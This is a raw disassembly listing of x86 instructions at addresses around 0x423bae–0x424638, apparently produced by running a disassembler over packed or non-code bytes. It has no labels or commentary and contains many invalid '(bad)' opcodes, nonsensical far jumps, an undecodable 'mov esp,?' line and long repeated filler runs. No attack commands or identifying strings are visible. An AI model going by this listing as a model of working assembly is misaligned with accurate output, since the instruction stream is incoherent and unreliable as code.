  423bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423baf:	bound  ecx,QWORD PTR [ecx+0xed1b64d]
  423bb5:	mov    DWORD PTR [ebx],edx
  423bb7:	ret    
  423bb8:	mov    BYTE PTR [ebp-0x5a],al
  423bbb:	add    DWORD PTR [ebx-0x4],0x0
	...
  423be6:	add    BYTE PTR [eax],al
  423be8:	adc    ebx,DWORD PTR [edi+0x31]
  423beb:	shl    BYTE PTR [ebp+0x4db3e95e],0x9b
  423bf2:	mov    ch,ah
  423bf4:	jecxz  0x423b8f
  423bf6:	retf   
  423bf7:	int3   
  423bf8:	mov    dl,BYTE PTR [esi-0x697d3335]
  423bfe:	retf   
  423bff:	int3   
  423c00:	jp     0x423b98
  423c02:	retf   
  423c03:	int3   
  423c04:	or     edx,edx
  423c06:	jmp    0x423b8b
  423c08:	push   0x62
  423c0a:	lds    eax,FWORD PTR [ebp+0x56]
  423c0d:	pop    edx
  423c0e:	xor    BYTE PTR [eax],al
  423c10:	xor    eax,DWORD PTR ds:[ebx+eax*1]
  423c14:	(bad)  
  423c15:	pop    edx
  423c16:	lahf   
  423c17:	cmp    al,0xb6
  423c19:	sbb    al,BYTE PTR [eax]
  423c1b:	push   eax
  423c1c:	es sub esp,edi
  423c1f:	jmp    FWORD PTR [ecx]
  423c21:	fld    st(3)
  423c23:	or     BYTE PTR [edi+0x7e6af41e],dh
  423c29:	ror    BYTE PTR [edx-0x8],1
  423c2c:	outs   dx,DWORD PTR ds:[esi]
  423c2d:	rcl    BYTE PTR [edx],1
  423c2f:	sbb    al,0x86
  423c31:	sbb    al,BYTE PTR [eax]
  423c33:	mov    edi,DWORD PTR [ebx+ebp*1+0x50]
  423c37:	push   0x3e
  423c39:	les    edx,FWORD PTR [edx-0xc]
  423c3c:	popf   
  423c3d:	outs   dx,DWORD PTR ds:[esi]
  423c3e:	js     0x423c81
  423c40:	fdivr  DWORD PTR ds:[edx]
  423c43:	adc    al,0x66
  423c45:	sbb    al,BYTE PTR [eax]
  423c47:	add    BYTE PTR [ebx+0x5c],dl
  423c4a:	mov    eax,0x2
	...
  423c73:	add    BYTE PTR [eax],al
  423c75:	add    BYTE PTR [esi],bh
  423c77:	pop    ebx
  423c78:	add    bl,ch
  423c7a:	push   esp
  423c7b:	ror    BYTE PTR [edx],1
  423c7d:	add    BYTE PTR [ebx+ebx*1],bh
  423c80:	add    BYTE PTR [ecx+0x67cb0b],cl
  423c86:	sub    DWORD PTR [edx+0x0],ebx
  423c89:	push   0x40593e
  423c8e:	mov    ch,0x6e
  423c90:	adc    al,0x78
  423c92:	call   FWORD PTR [edx+0x7f]
  423c95:	ret    0x593e
  423c98:	add    BYTE PTR [eax],al
  423c9a:	in     al,dx
  423c9b:	mov    dl,0x9d
  423c9d:	inc    BYTE PTR [ecx+0x4ac480c4]
  423ca3:	add    eax,DWORD PTR [eax]
  423ca5:	add    bh,dh
  423ca7:	pop    edx
  423ca8:	sub    eax,DWORD PTR [eax]
  423caa:	cmp    al,0x5b
  423cac:	add    BYTE PTR [ebx+0x41786f33],cl
  423cb2:	ds jo  0x423c7d
  423cb5:	mov    DWORD PTR [ebx+0x1f],eax
  423cb8:	js     0x423cfb
  423cba:	rcl    BYTE PTR ds:[edx],1
  423cbd:	inc    esp
  423cbe:	(bad)  
  423cbf:	sbb    DWORD PTR [eax],eax
  423cc1:	push   edx
  423cc2:	fild   QWORD PTR [esi+0x78]
  423cc5:	inc    ecx
  423cc6:	sub    ecx,DWORD PTR ds:[ecx-0x17d5d1b3]
  423ccd:	popf   
  423cce:	and    al,ah
  423cd0:	cld    
  423cd1:	add    DWORD PTR [edx],0x57
  423cd4:	mov    DWORD PTR ds:0x3f432a,edx
	...
  423d02:	add    BYTE PTR [eax],al
  423d04:	cmp    eax,0x6b89082e
  423d09:	mov    bl,0x88
  423d0b:	push   ebp
  423d0c:	out    0xc3,al
  423d0e:	loope  0x423c9b
  423d10:	(bad)  ds:0x96faccc1
  423d16:	retf   
  423d17:	int3   
  423d18:	mov    edx,eax
  423d1a:	jmp    0x423ca7
  423d1c:	adc    DWORD PTR [ebx+0x39],0x45
  423d20:	inc    edx
  423d21:	dec    eax
  423d22:	add    eax,0xe953838b
  423d27:	add    eax,0x458957d5
  423d2c:	dec    edx
  423d2d:	es ror esp,0x82
  423d31:	xchg   esi,eax
  423d32:	retf   
  423d33:	int3   
  423d34:	jp     0x423ccc
  423d36:	retf   
  423d37:	int3   
  423d38:	or     edx,eax
  423d3a:	jmp    0x423cbf
  423d3c:	stos   BYTE PTR es:[edi],al
  423d3d:	jbe    0x423d04
  423d3f:	inc    ebp
  423d40:	xchg   edx,eax
  423d41:	pop    edx
  423d42:	nop
  423d43:	add    DWORD PTR [esi],edi
  423d45:	rol    BYTE PTR [edx+0x8],1
  423d48:	mov    bh,0x1d
  423d4a:	fmul   DWORD PTR [ebx+0x5588a30b]
  423d50:	inc    esi
  423d51:	pop    eax
  423d52:	dec    edi
  423d53:	cmp    al,0xb7
  423d55:	sub    eax,0xbafb8be0
  423d5a:	or     al,0xb7
  423d5c:	push   es
  423d5d:	outs   dx,DWORD PTR ds:[esi]
  423d5e:	mov    DWORD PTR [ebp+0x5e],edx
  423d61:	aad    0x43
  423d63:	or     ah,BYTE PTR [esi]
  423d65:	rol    BYTE PTR [edx-0x18],cl
	...
  423d90:	add    BYTE PTR [eax],al
  423d92:	(bad)  
  423d93:	outs   dx,BYTE PTR ds:[esi]
  423d94:	add    DWORD PTR [eax+0x3e],eax
  423d97:	(bad)  
  423d98:	or     bh,BYTE PTR [esi+esi*4]
  423d9b:	sbb    al,0x0
  423d9d:	push   ecx
  423d9e:	push   ss
  423d9f:	adc    edi,ecx
  423da1:	jmp    DWORD PTR [ecx]
  423da3:	ffreep st(3)
  423da5:	or     bh,al
  423da7:	sbb    al,dh
  423da9:	push   0x7e
  423dab:	xor    eax,DWORD PTR [eax]
  423dad:	xor    BYTE PTR [esi],bh
  423daf:	pop    ebx
  423db0:	push   0x5cae00
  423db5:	push   0x3e
  423db7:	ret    0xf052
  423dba:	(bad)  
  423dbb:	sbb    ah,ah
  423dbd:	mov    edx,DWORD PTR [ebx-0x75bd7745]
  423dc3:	sub    ecx,DWORD PTR [ecx-0x76d3b9b3]
  423dc9:	push   ebp
  423dca:	fisubr DWORD PTR ds:0xc2cbc1e8
  423dd0:	cld    
  423dd1:	cmp    edx,0x4f
  423dd4:	lds    eax,FWORD PTR [ebp-0x4e]
  423dd7:	pop    ebx
  423dd8:	add    BYTE PTR [eax],al
  423dda:	ds mov dh,0x6
  423ddd:	mov    eax,DWORD PTR [ebx]
  423ddf:	mov    DWORD PTR [eax+0x42d43fc0],0xe010c5f4
  423de9:	bswap  ecx
  423deb:	sub    al,0x6
  423ded:	cmp    ebx,esi
  423def:	(bad)  
  423df0:	jo     0x423e4b
  423df2:	mov    ch,0x18
  423df4:	call   0x423e7c
	...
  423e1d:	add    BYTE PTR [eax],al
  423e1f:	add    dh,dh
  423e21:	data16 add BYTE PTR [ebx+edi*8-0x2b],dh
  423e26:	dec    edx
  423e27:	call   0x5282e9
  423e2c:	jmp    0x41d6:0x6655897e
  423e33:	adc    ch,al
  423e35:	adc    al,ah
  423e37:	mov    ebp,edi
  423e39:	jle    0x423dc6
  423e3b:	inc    esp
  423e3c:	cs ret 0x4d88
  423e40:	push   ds
  423e41:	mov    ss,edx
  423e43:	imul   DWORD PTR [edi+0x1e55897f]
  423e49:	push   edx
  423e4a:	lods   eax,DWORD PTR ds:[esi]
  423e4b:	inc    edx
  423e4c:	bound  ebp,QWORD PTR [ebx]
  423e4e:	mov    DWORD PTR [ebp+0x26],eax
  423e51:	(bad)  
  423e52:	dec    edx
  423e53:	or     BYTE PTR ds:0xb5511413,bh
  423e59:	daa    
  423e5a:	call   0xf9b9ea
  423e5f:	inc    edx
  423e60:	dec    edx
  423e61:	sub    ebp,eax
  423e63:	push   ebp
  423e64:	repz sar esp,0x83
  423e68:	add    cl,BYTE PTR [edi-0x77]
  423e6b:	dec    ebp
  423e6c:	(bad)  
  423e6d:	fnstsw WORD PTR [esi-0x17f038d8]
  423e73:	jmp    0x423e21
  423e75:	aad    0x52
  423e77:	in     al,0x6c
  423e79:	mov    bl,0xd
  423e7b:	cld    
  423e7c:	rol    ecx,0x80
  423e7f:	les    eax,FWORD PTR [edx+0x33]
  423e82:	and    al,0x3
	...
  423eac:	add    BYTE PTR [eax],al
  423eae:	(bad)  
  423eaf:	pop    edx
  423eb0:	lahf   
  423eb1:	cmp    al,0x26
  423eb3:	sbb    al,0x0
  423eb5:	push   eax
  423eb6:	xchg   esi,eax
  423eb7:	aad    0xf9
  423eb9:	call   FWORD PTR [ecx-0x38f73c23]
  423ebf:	pop    ss
  423ec0:	fadd   QWORD PTR [ebx+0x4178834b]
  423ec6:	ds pop ebx
  423ec8:	jae    0x423ed4
  423eca:	lds    ecx,FWORD PTR [edi+0x30]
  423ecd:	js     0x423ece
  423ecf:	pop    edx
  423ed0:	dec    edi
  423ed1:	call   DWORD PTR [ebx]
  423ed3:	lahf   
  423ed4:	cmp    BYTE PTR ds:0x3f4326,0x3e
  423edb:	dec    eax
  423edc:	sbb    al,0x6a
  423ede:	(bad)  
  423edf:	xor    al,BYTE PTR [eax]
  423ee1:	xor    BYTE PTR [esi],bh
  423ee3:	pop    ebx
  423ee4:	mov    DWORD PTR [ebp+0x42],edx
  423ee7:	sub    al,0x89
  423ee9:	inc    ebp
  423eea:	push   ds
  423eeb:	aad    0x47
  423eed:	xor    al,0x8f
  423eef:	rcl    BYTE PTR [edx-0x10],0xdd
  423ef3:	addr16 js 0x423f37
  423ef6:	ds mov ah,0x12
  423ef9:	push   0x7e
  423efb:	xor    eax,DWORD PTR [eax]
  423efd:	xor    BYTE PTR [esi],bh
  423eff:	pop    ebx
  423f00:	mov    DWORD PTR [ebp+0xa],edx
  423f03:	cs push 0x0
  423f06:	add    DWORD PTR [edi],esp
  423f08:	lock mov ds:0x3f4352,eax
  423f0e:	mov    ebp,0x78147e
	...
  423f3b:	add    BYTE PTR [edi+0x5b],bh
  423f3e:	add    BYTE PTR [ebp+0x4b],dh
  423f41:	xor    eax,0x8b3e6840
  423f46:	add    BYTE PTR [eax],al
  423f48:	lds    edx,FWORD PTR [esi]
  423f4a:	cld    
  423f4b:	push   eax
  423f4c:	push   esp
  423f4d:	pop    ebx
  423f4e:	std    
  423f4f:	push   ebp
  423f50:	into   
  423f51:	cld    
  423f52:	adc    edi,DWORD PTR [eax-0x1]
  423f55:	pop    edx
  423f56:	mov    DWORD PTR [ebp-0x66],ecx
  423f59:	ror    BYTE PTR [edx-0x28],cl
  423f5c:	mov    ch,0x26
  423f5e:	fmul   DWORD PTR [ebx+0x4200a2fb]
  423f64:	pop    edx
  423f65:	rol    BYTE PTR [edx-0x20],cl
  423f68:	lds    ecx,FWORD PTR [esi]
  423f6a:	cld    
  423f6b:	push   ecx
  423f6c:	mov    ch,0x26
  423f6e:	in     al,0x52
  423f70:	fbld   TBYTE PTR [edi+0x78]
  423f73:	inc    ecx
  423f74:	ds sub ebp,eax
  423f77:	xchg   ebp,eax
  423f78:	jb     0x423f3a
  423f7a:	cld    
  423f7b:	add    DWORD PTR [edx+0x5e4d894f],0xffffffdc
  423f82:	mov    dh,0xa4
  423f84:	ds pop ebx
  423f86:	add    BYTE PTR [eax],al
  423f88:	retf   0x8984
  423f8b:	push   ebp
  423f8c:	pop    esi
  423f8d:	aam    0x42
  423f8f:	fdivr  DWORD PTR ds:0x3e009fdd
  423f95:	pop    ebx
  423f96:	xchg   DWORD PTR [ebp+0x22],eax
  423f99:	aam    0x4a
  423f9b:	loopne 0x423f52
  423f9d:	gs adc al,0x78
	...
  423fc8:	add    BYTE PTR [eax],al
  423fca:	jg     0x424027
  423fcc:	sub    DWORD PTR [ecx+0x52],edx
  423fcf:	rcl    BYTE PTR [edx],cl
  423fd1:	inc    esp
  423fd2:	xchg   esi,eax
  423fd3:	sbb    al,BYTE PTR [eax]
  423fd5:	mov    eax,ds:0x3f4382
  423fda:	outs   dx,BYTE PTR ds:[esi]
  423fdb:	aam    0xa
  423fdd:	adc    al,0x76
  423fdf:	sbb    al,BYTE PTR [eax]
  423fe1:	push   ecx
  423fe2:	lds    esp,FWORD PTR ds:0x3fd652ec
  423fe8:	cli    
  423fe9:	jmp    ecx
  423feb:	fcmovnb st,st(3)
  423fed:	or     al,0xc5
  423fef:	adc    eax,0x67438be0
  423ff4:	js     0x424037
  423ff6:	ds pop esp
  423ff8:	dec    eax
  423ff9:	sub    BYTE PTR [edi-0x87abb3],dh
  423fff:	pop    edx
  424000:	cmp    DWORD PTR ds:0x3f4376,0x8b2b463e
  42400a:	dec    ebx
  42400b:	addr16 js 0x42404f
  42400e:	ds sub eax,0x1a16549f
  424014:	add    BYTE PTR [eax-0x4b],dl
  424017:	dec    ebp
  424018:	xor    BYTE PTR [eax-0x1],bh
  42401b:	pop    edx
  42401c:	dec    edi
  42401d:	call   0x3eff18
  424022:	mov    ebp,0x538b0b96
  424027:	addr16 js 0x42406b
  42402a:	ds sub eax,0x49e8
	...
  424058:	push   edi
  424059:	mov    edi,0x567a83fc
  42405e:	jmp    0x1c916c4
  424063:	inc    eax
  424064:	ds cli 
  424066:	cmp    edi,DWORD PTR [eax+0x7f]
  424069:	pop    ebx
  42406a:	push   eax
  42406b:	call   0x3f04fa
  424070:	mov    ebp,0x7b890797
  424075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424076:	mov    BYTE PTR ds:0x3f4332,cl
  42407c:	outs   dx,DWORD PTR ds:[esi]
  42407d:	rcl    BYTE PTR [edx-0x20],cl
  424080:	fbld   TBYTE PTR [edi+0x78]
  424083:	inc    ecx
  424084:	ds pop edx
  424086:	inc    edx
  424087:	sub    BYTE PTR [esi+0x76300ad2],cl
  42408d:	sbb    al,0x0
  42408f:	push   ecx
  424090:	(bad)  
  424091:	outs   dx,BYTE PTR ds:[esi]
  424092:	cld    
  424093:	jmp    ecx
  424095:	fcmovb st,st(3)
  424097:	or     al,0xc5
  424099:	push   0x5b7f7830
  42409e:	jg     0x424062
  4240a0:	scas   al,BYTE PTR es:[edi]
  4240a1:	dec    eax
  4240a2:	(bad)  
  4240a3:	push   DWORD PTR [edi-0x87a398]
  4240a9:	pop    edx
  4240aa:	mov    eax,DWORD PTR [ebp-0x4a]
  4240ad:	sub    ebp,DWORD PTR [edx+0x40]
  4240b0:	adc    al,0x55
  4240b2:	mov    DWORD PTR ds:0x3f4302,ecx
  4240b8:	out    dx,eax
  4240b9:	mov    ebp,0xd452
	...
  4240e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240e7:	mov    edx,0x389fff8
  4240ec:	(bad)  
  4240ed:	(bad)  
  4240ee:	ds pop ebx
  4240f0:	mov    ebp,esp
  4240f2:	sbb    ebx,DWORD PTR [ecx-0x707dfffd]
  4240f8:	retf   
  4240f9:	int3   
  4240fa:	jp     0x42408b
  4240fc:	retf   
  4240fd:	int3   
  4240fe:	or     edx,edx
  424100:	jmp    0x42408d
  424102:	add    edx,DWORD PTR [ebx-0x77]
  424105:	inc    eax
  424106:	push   edx
  424107:	and    cl,al
  424109:	int3   
  42410a:	jp     0x42409b
  42410c:	retf   
  42410d:	int3   
  42410e:	jmp    0x4240e1
  424110:	jmp    0x424165
  424112:	nop
  424113:	mov    DWORD PTR es:0x3f435e,edi
  42411a:	mov    ch,0x5f
  42411c:	sub    al,0x78
  42411e:	jg     0x42417b
  424120:	mov    DWORD PTR ds:0x3f4336,esi
  424126:	jno    0x424145
  424128:	pop    ecx
  424129:	pop    ebp
  42412a:	std    
  42412b:	mov    cs,ebx
  42412d:	int3   
  42412e:	imul   edx,edx,0xffffffeb
  424131:	push   ecx
  424132:	popw   ss
  424134:	add    DWORD PTR [eax+0x3e],eax
  424137:	cld    
  424138:	cmp    edi,DWORD PTR [eax+0x7f]
  42413b:	pop    ebx
  42413c:	push   eax
  42413d:	call   0x3f03d4
  424142:	mov    ebp,0x7b890796
  424147:	mov    edi,0x4d88
	...
  424174:	ss sub al,0x6a
  424177:	add    BYTE PTR [ebp-0x87a799],dh
  42417d:	pop    edx
  42417e:	push   edx
  42417f:	dec    DWORD PTR [ebx]
  424181:	mov    edi,0x9a0be588
  424186:	retf   
  424187:	int3   
  424188:	or     edx,edx
  42418a:	jmp    0x42410f
  42418c:	stos   BYTE PTR es:[edi],al
  42418d:	jbe    0x424154
  42418f:	inc    ebp
  424190:	xchg   esi,eax
  424191:	pop    edx
  424192:	add    BYTE PTR [eax],al
  424194:	ds xchg esi,eax
  424196:	inc    edx
  424197:	fadd   QWORD PTR [esi]
  424199:	pop    ebx
  42419a:	add    BYTE PTR [eax],al
  42419c:	adc    DWORD PTR [edi],0x5b3e01f4
  4241a2:	add    bh,al
  4241a4:	add    edi,DWORD PTR [edi+0x5b3effff]
  4241aa:	lds    eax,FWORD PTR [ebp+0x62]
  4241ad:	pop    edx
  4241ae:	add    BYTE PTR [eax],al
  4241b0:	ror    BYTE PTR ds:[edx+0x8],cl
  4241b4:	mov    bh,0x4f
  4241b6:	xor    BYTE PTR [eax-0x1],bh
  4241b9:	pop    edx
  4241ba:	call   0xfcff7368
  4241bf:	mov    eax,ds:0x3f436e
  4241c4:	arpl   WORD PTR [esp+edi*8+0xc473e00],di
  4241cb:	mov    DWORD PTR [ebx-0x7d],0x5b3e4178
  4241d2:	add    BYTE PTR [eax],al
  4241d4:	ds mov al,0x9
  4241d7:	mov    DWORD PTR [eax],0x0
	...
  424201:	add    BYTE PTR [ebx],bh
  424203:	cmp    DWORD PTR [eax+0x41],0x3e
  424207:	pop    edx
  424208:	add    BYTE PTR [eax],al
  42420a:	fdivr  DWORD PTR ds:[edx]
  42420d:	xor    BYTE PTR [esi+0x1a],ah
  424210:	add    BYTE PTR [eax],al
  424212:	imul   edx,DWORD PTR [ecx-0x3b],0x5
  424216:	push   ss
  424217:	inc    ebx
  424218:	aas    
  424219:	add    BYTE PTR [esi],bh
  42421b:	pop    ebx
  42421c:	add    BYTE PTR [eax],al
  42421e:	mov    ebp,0x7f78387e
  424223:	pop    ebx
  424224:	add    BYTE PTR [ebp+0x4b],dh
  424227:	xor    DWORD PTR [eax],eax
  424229:	dec    DWORD PTR [ebx+0x5b]
  42422c:	js     0x42426f
  42422e:	ds clc 
  424230:	das    
  424231:	js     0x424232
  424233:	pop    edx
  424234:	mov    DWORD PTR ds:0x3f434e,ecx
  42423a:	(bad)  
  42423b:	push   cs
  42423c:	call   0x78cd75cc
  424241:	inc    ecx
  424242:	rol    BYTE PTR ds:[edx-0x18],1
  424246:	cmp    eax,0xfb893c19
  42424b:	mov    dl,0x88
  42424d:	dec    ebp
  42424e:	push   esi
  42424f:	ror    BYTE PTR [edx],cl
  424251:	sbb    al,0xe6
  424253:	sbb    DWORD PTR [eax],eax
  424255:	push   0x4057ee
  42425a:	push   ecx
  42425b:	data16 add BYTE PTR [eax-0x1],bh
  42425f:	pop    edx
  424260:	mov    eax,ds:0x19c63c
  424265:	mov    DWORD PTR [eax],0x0
	...
  42428f:	add    BYTE PTR [ebx+0xf],al
  424292:	js     0x4242d5
  424294:	ds inc esi
  424296:	add    DWORD PTR [eax+0x3e],eax
  424299:	xor    esp,DWORD PTR [eax+0x3]
  42429c:	jle    0x4242f9
  42429e:	mov    DWORD PTR ds:0x3f435a,edx
  4242a4:	ins    BYTE PTR es:[edi],dx
  4242a5:	mov    bl,0xc1
  4242a7:	test   DWORD PTR [ecx],0x36c480bc
  4242ad:	clc    
  4242ae:	inc    edi
  4242af:	js     0x424330
  4242b1:	pop    ebx
  4242b2:	std    
  4242b3:	adc    eax,0x3f4386
  4242b8:	popf   
  4242b9:	and    bh,BYTE PTR [eax+0x41]
  4242bc:	ds cli 
  4242be:	dec    ebx
  4242bf:	js     0x424340
  4242c1:	pop    ebx
  4242c2:	push   eax
  4242c3:	call   0x3eff52
  4242c8:	mov    ebp,0x7b890396
  4242cd:	retf   
  4242ce:	mov    BYTE PTR [ebp-0x52],cl
  4242d1:	sub    eax,ebp
  4242d3:	aad    0xb0
  4242d5:	mov    ebx,0x568283fc
  4242da:	mov    eax,ds:0x1a2634
  4242df:	mov    esi,ebx
  4242e1:	retf   0x6a51
  4242e4:	ds cli 
  4242e6:	xor    edi,DWORD PTR [eax-0x1]
  4242e9:	pop    edx
  4242ea:	push   eax
  4242eb:	call   0x3f0692
  4242f0:	mov    ebp,0x8b0b96
	...
  42431d:	add    BYTE PTR [ebx],al
  42431f:	retf   
  424320:	xchg   BYTE PTR [ebp+0x5e],cl
  424323:	iret   
  424324:	push   edx
  424325:	cld    
  424326:	and    eax,0xf473f026
  42432b:	iret   
  42432c:	inc    edx
  42432d:	loopne 0x42431d
  42432f:	iret   
  424330:	dec    edx
  424331:	fsub   st(7),st
  424333:	mov    dl,0xad
  424335:	sti    
  424336:	inc    ecx
  424337:	mov    ebx,0xfe46c480
  42433c:	aas    
  42433d:	js     0x4243be
  42433f:	pop    ebx
  424340:	mov    DWORD PTR ds:0x3f337e,edx
  424346:	mov    esp,?
  424348:	dec    ebx
  424349:	js     0x4243ca
  42434b:	pop    ebx
  42434c:	add    DWORD PTR [ebp+0x1a],eax
  42434f:	or     al,0x89
  424351:	or     eax,0x3f3352
  424356:	cmp    eax,0xe651fc28
  42435b:	xchg   edx,eax
  42435c:	idiv   bh
  42435e:	icebp  
  42435f:	faddp  st(3),st
  424361:	or     al,0xb5
  424363:	adc    ah,dh
  424365:	add    ecx,DWORD PTR [ebx-0x1daaff69]
  42436b:	in     al,0x52
  42436d:	in     al,0xc5
  42436f:	and    ah,bh
  424371:	add    eax,DWORD PTR [ebx-0x3dba7969]
  424377:	out    0x4a,al
  424379:	loopne 0x4243e0
  42437b:	push   0x5aff7840
  424380:	xchg   DWORD PTR [ebp+0x0],ecx
	...
  4243ab:	add    BYTE PTR [esi-0x438623a],bl
  4243b1:	mov    dl,0xff
  4243b3:	(bad)  
  4243b4:	ds pop ebx
  4243b6:	jmp    0xf85308c4
  4243bb:	cmp    DWORD PTR [edi+ebx*2-0x79],0x55
  4243c0:	xchg   dh,ah
  4243c2:	inc    edx
  4243c3:	clc    
  4243c4:	xor    eax,0x3673f020
  4243c9:	out    0xa,al
  4243cb:	xor    al,0xe6
  4243cd:	sbb    eax,DWORD PTR [eax]
  4243cf:	add    esi,ebx
  4243d1:	mov    dl,0x88
  4243d3:	adc    DWORD PTR ds:0xaa1f810,edi
  4243d9:	xor    edi,DWORD PTR [edi]
  4243db:	add    BYTE PTR ds:0x2e89f820,bh
  4243e1:	out    0x4a,al
  4243e3:	clc    
  4243e4:	mov    edi,0x3e03e69b
  4243e9:	pop    ebx
  4243ea:	mov    DWORD PTR ds:0x3f3372,edx
  4243f0:	cmp    eax,0x4433f810
  4243f5:	cld    
  4243f6:	xor    edi,DWORD PTR [eax+0x7f]
  4243f9:	pop    ebx
  4243fa:	add    DWORD PTR [ebp+0x6],eax
  4243fd:	in     al,0x7
  4243ff:	jmp    0x4243ca
  424401:	jecxz  0x42442d
  424403:	and    al,0x76
  424405:	sbb    al,0x0
  424407:	mov    DWORD PTR [ebx],esi
  424409:	jnp    0x424483
  42440b:	inc    ecx
  42440c:	outs   dx,BYTE PTR ds:[esi]
  42440e:	(bad)  
  42440f:	mov    DWORD PTR [eax],eax
	...
  424439:	add    BYTE PTR [ebx],ch
  42443b:	push   ebx
  42443c:	js     0x42447f
  42443e:	outs   dx,BYTE PTR ds:[esi]
  424440:	(bad)  
  424441:	mov    DWORD PTR [ebx],esi
  424443:	xchg   DWORD PTR [eax+0x41],edi
  424446:	ds ret 
  424448:	dec    ebp
  424449:	test   ecx,0xe90d8ab9
  42444f:	xor    DWORD PTR [edi],edi
  424451:	add    bh,al
  424453:	daa    
  424454:	clc    
  424455:	mov    ecx,0x405d3e
  42445a:	mov    edi,0x3e01ffc3
  42445f:	pop    ebx
  424460:	mov    DWORD PTR [ebp-0x6a],edx
  424463:	test   edi,ecx
  424465:	mov    DWORD PTR [ebx],esi
  424467:	cmp    DWORD PTR [eax+0x41],0x3e
  42446b:	cld    
  42446c:	daa    
  42446d:	js     0x42446e
  42446f:	pop    edx
  424470:	push   eax
  424471:	call   0x3ef9b0
  424476:	mov    ebp,0x338b039e
  42447b:	outs   dx,DWORD PTR ds:[esi]
  42447c:	js     0x4244bf
  42447e:	ds or  al,0xe8
  424481:	aad    0x54
  424483:	mov    ecx,0x2f7e85fc
  424488:	add    al,0x33
  42448a:	jle    0x424451
  42448c:	sub    DWORD PTR [ebx+0x41787f63],ecx
  424492:	ds fadd st(3),st
  424495:	add    al,0xbd
  424497:	jbe    0x4244d1
  424499:	js     0x42451a
  42449b:	pop    ebx
  42449c:	add    BYTE PTR [eax+eax*1+0x0],dh
	...
  4244c8:	inc    edi
  4244c9:	cli    
  4244ca:	adc    edi,DWORD PTR [eax+0x7f]
  4244cd:	pop    ebx
  4244ce:	xchg   DWORD PTR [edx+eiz*2+0x5f],eax
  4244d2:	call   0xfcfb4834
  4244d7:	mov    edx,DWORD PTR [ebx+0xf]
  4244da:	js     0x42451d
  4244dc:	ds or  eax,0xe4fe33c1
  4244e2:	loop   0x424541
  4244e4:	std    
  4244e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244e6:	retf   
  4244e7:	int3   
  4244e8:	ds pop ebx
  4244ea:	add    BYTE PTR [eax],al
  4244ec:	ds pop ebx
  4244ee:	add    BYTE PTR [eax],al
  4244f0:	ds pop ebx
  4244f2:	add    BYTE PTR [eax],al
  4244f4:	ds pop ebx
  4244f6:	add    BYTE PTR [eax],al
  4244f8:	ds pop ebx
  4244fa:	add    BYTE PTR [eax],al
  4244fc:	ds pop ebx
  4244fe:	add    BYTE PTR [eax],al
  424500:	ds pop ebx
  424502:	add    BYTE PTR [eax],al
  424504:	ds pop ebx
  424506:	add    BYTE PTR [eax],al
  424508:	ds pop ebx
  42450a:	add    BYTE PTR [eax],al
  42450c:	ds pop ebx
  42450e:	add    BYTE PTR [eax],al
  424510:	ds pop ebx
  424512:	add    BYTE PTR [eax],al
  424514:	ds pop ebx
  424516:	add    BYTE PTR [eax],al
  424518:	ds pop ebx
  42451a:	add    BYTE PTR [eax],al
  42451c:	ds pop ebx
  42451e:	add    BYTE PTR [eax],al
  424520:	ds pop ebx
  424522:	add    BYTE PTR [eax],al
  424524:	ds pop ebx
  424526:	add    BYTE PTR [eax],al
  424528:	ds pop ebx
	...
  424556:	ds pop ebx
  424558:	add    BYTE PTR [eax],al
  42455a:	ds pop ebx
  42455c:	add    BYTE PTR [eax],al
  42455e:	ds pop ebx
  424560:	add    BYTE PTR [eax],al
  424562:	ds pop ebx
  424564:	add    BYTE PTR [eax],al
  424566:	ds pop ebx
  424568:	add    BYTE PTR [eax],al
  42456a:	ds pop ebx
  42456c:	add    BYTE PTR [eax],al
  42456e:	ds pop ebx
  424570:	add    BYTE PTR [eax],al
  424572:	ds pop ebx
  424574:	add    BYTE PTR [eax],al
  424576:	ds pop ebx
  424578:	add    BYTE PTR [eax],al
  42457a:	ds pop ebx
  42457c:	add    BYTE PTR [eax],al
  42457e:	ds pop ebx
  424580:	add    BYTE PTR [eax],al
  424582:	ds pop ebx
  424584:	add    BYTE PTR [eax],al
  424586:	ds pop ebx
  424588:	add    BYTE PTR [eax],al
  42458a:	ds pop ebx
  42458c:	add    BYTE PTR [eax],al
  42458e:	ds pop ebx
  424590:	add    BYTE PTR [eax],al
  424592:	ds pop ebx
  424594:	add    BYTE PTR [eax],al
  424596:	ds pop ebx
  424598:	add    BYTE PTR [eax],al
  42459a:	ds pop ebx
  42459c:	add    BYTE PTR [eax],al
  42459e:	ds pop ebx
  4245a0:	add    BYTE PTR [eax],al
  4245a2:	ds pop ebx
  4245a4:	add    BYTE PTR [eax],al
  4245a6:	ds pop ebx
  4245a8:	add    BYTE PTR [eax],al
  4245aa:	ds pop ebx
  4245ac:	add    BYTE PTR [eax],al
  4245ae:	ds pop ebx
  4245b0:	add    BYTE PTR [eax],al
  4245b2:	ds pop ebx
  4245b4:	add    BYTE PTR [eax],al
  4245b6:	ds pop ebx
	...
  4245e4:	ds pop ebx
  4245e6:	add    BYTE PTR [eax],al
  4245e8:	ds pop ebx
  4245ea:	add    BYTE PTR [eax],al
  4245ec:	ds pop ebx
  4245ee:	add    BYTE PTR [eax],al
  4245f0:	ds pop ebx
  4245f2:	add    BYTE PTR [eax],al
  4245f4:	ds pop ebx
  4245f6:	add    BYTE PTR [eax],al
  4245f8:	ds pop ebx
  4245fa:	add    BYTE PTR [eax],al
  4245fc:	ds pop ebx
  4245fe:	add    BYTE PTR [eax],al
  424600:	ds pop ebx
  424602:	add    BYTE PTR [eax],al
  424604:	ds pop ebx
  424606:	add    BYTE PTR [eax],al
  424608:	ds pop ebx
  42460a:	add    BYTE PTR [eax],al
  42460c:	ds pop ebx
  42460e:	add    BYTE PTR [eax],al
  424610:	ds pop ebx
  424612:	add    BYTE PTR [eax],al
  424614:	ds pop ebx
  424616:	add    BYTE PTR [eax],al
  424618:	ds pop ebx
  42461a:	add    BYTE PTR [eax],al
  42461c:	ds pop ebx
  42461e:	add    BYTE PTR [eax],al
  424620:	ds pop ebx
  424622:	add    BYTE PTR [eax],al
  424624:	ds pop ebx
  424626:	add    BYTE PTR [eax],al
  424628:	ds pop ebx
  42462a:	add    BYTE PTR [eax],al
  42462c:	ds pop ebx
  42462e:	add    BYTE PTR [eax],al
  424630:	ds pop ebx
  424632:	add    BYTE PTR [eax],al
  424634:	ds pop ebx
  424636:	add    BYTE PTR [eax],al
  424638:	ds pop ebx
